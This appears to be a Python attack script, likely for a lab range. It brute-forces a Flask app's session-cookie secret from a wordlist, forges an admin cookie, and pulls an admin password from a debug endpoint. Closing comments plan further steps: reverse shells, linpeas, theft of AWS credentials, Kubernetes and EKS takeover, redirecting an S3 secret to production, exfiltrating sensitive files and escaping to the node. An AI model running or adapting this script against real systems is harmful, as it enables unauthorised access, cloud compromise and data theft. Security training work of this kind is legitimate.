#!/usr/bin/env python3.9

import requests
import subprocess
import flask_unsign
from flask_unsign.helpers import wordlist
import json

# URL of the Flask web server
webserver_url = 'http://authapp.attacker-hub.freeddns.org:8000'

# Send a request to the Flask webserver and obtain the session cookie
s = requests.Session()
response = s.get(webserver_url)
if 'session' in s.cookies:
    session_cookie = s.cookies['session']
    print(f"Session cookie obtained: {session_cookie}")
else:
    raise ValueError("Session cookie not found in the response.")

# bruteforce secret
cookie_value = 'eyJfZnJlc2giOnRydWUsIl9pZCI6ImJvb3lhaCIsIl91c2VyX2lkIjoiMiIsIkZFQVRVUkVfRkxBRyI6IkFETUlOUFdEIn0.ZboADQ.1cg_Nncg6kGWMjpShtUSsVCG-k0'
cookie_secret = ""
with open('passwords.txt') as f:
    for word in f.read().splitlines():
        print(f"checking: {word}")
        verified = flask_unsign.verify(cookie_value, word)
        if verified:
            print(f"success: {word}")
            cookie_secret = word
            break
        else:
            print(f"failed: {word}")

kwargs = {
    'value': {'_fresh': True, '_id': 'booyah', '_user_id': '2', 'FEATURE_FLAG': 'ADMINPWD'},
    'secret': cookie_secret
}
print(f"setting up admin cookie: {kwargs}")
signed_cookie = flask_unsign.sign(**kwargs)
print(f"signed cookie: {signed_cookie}")

cookieCommonDict = {
    "domain": "authapp.attacker-hub.freeddns.org",
    "path": "/",
    "secure": False,
    "version": 0,
}

s.cookies.set(name="session", value=signed_cookie, **cookieCommonDict)
r = s.get(f'{webserver_url}/debug/feature-status')
print(f"Response: {r.json()}")
feature = r.json()
admin_password = feature["Environment"]["Variable"]["FEATURE_FLAG"]
decoded_admin_password = bytes.fromhex(admin_password).decode('utf-8')

print(admin_password)

# now we need to:
# - start an ssh session with this password to jumphost.attacker-hub.freedns.org
# - retrieve the private key from jump host
# - nmap scan to discover kubeadmin
# - ssh into kubeadmin using discovered password
# - run reverse shell
# - reverse shell executes linpeas and pulls back aws credentials
# - use credentials to call aws eks list-clusters and find our cluster
# - use credentials to call aws eks update-kubeconfig --name=<cluster>
# - run general kubernetes discovery (e.g. pierates)
# - discover s3app pod with directory listing
# - use same debug interface to grab BUCKET_NAME containing arn for s3 dev bucket (from secret)
# - list secrets to discovery BUCKET_NAME secret store
# - update BUCKET_NAME value to point to prod
# - list files in prod using updated pod (may need to rollout restart if reloader doesn't work here)
# - download sensitive files
# - optional
# - start privileged pod to mount node filesystem
# - start second reverse shell with nmap and linpeas.sh from node
# - exec into s3app to obtain a session for the role used in the pod
# - abuse this as necessary
